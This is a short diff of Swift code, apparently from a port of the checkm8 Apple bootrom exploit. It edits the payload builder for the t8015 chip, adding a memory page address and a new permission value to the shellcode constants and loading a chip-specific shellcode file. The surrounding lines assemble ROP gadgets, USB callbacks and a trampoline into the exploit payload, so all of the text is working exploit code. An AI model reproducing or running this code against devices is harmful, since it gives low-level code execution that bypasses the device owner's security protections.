@@ -268,6 +268,8 @@ fileprivate func getDevicePayload(device: Int) -> Data {
             PAYLOAD_OFFSET_ARM64, // 6 - PAYLOAD_OFFSET
             PAYLOAD_SIZE_ARM64,   // 7 - PAYLOAD_SIZE
             0x180008638,          // 8 - PAYLOAD_PTR
+            0x18000C400,          // 9 - page
+            0x60000100000625,     // 10 - new_perm
         ] as [UInt64]
 
         let t8015_load_write_gadget:        UInt64 = 0x10000945C
@@ -296,7 +298,7 @@ fileprivate func getDevicePayload(device: Int) -> Data {
 
         let t8015_callback_data = usb_rop_callbacks(address: 0x18001C020, func_gadget: t8015_func_gadget, callbacks: t8015_callbacks)
         let t8015_handler = asm_arm64_x7_trampoline(dest: t8015_handle_interface_request) + asm_arm64_branch(src: 0x10, dest: 0x0) + loadShellcode64(name: "usb_0xA1_2_arm64", constants: constants_usb_t8015).advanced(by: 4)
-        var t8015_shellcode = loadShellcode64(name: "checkm8_arm64", constants: constants_checkm8_t8015)
+        var t8015_shellcode = loadShellcode64(name: "checkm8_arm64_8015", constants: constants_checkm8_t8015)
         require(t8015_shellcode.count <= PAYLOAD_OFFSET_ARM64)
         require(t8015_handler.count <= PAYLOAD_SIZE_ARM64)
         t8015_shellcode = t8015_shellcode + Data(repeating: 0, count: Int(PAYLOAD_OFFSET_ARM64 - UInt64(t8015_shellcode.count))) + t8015_handler
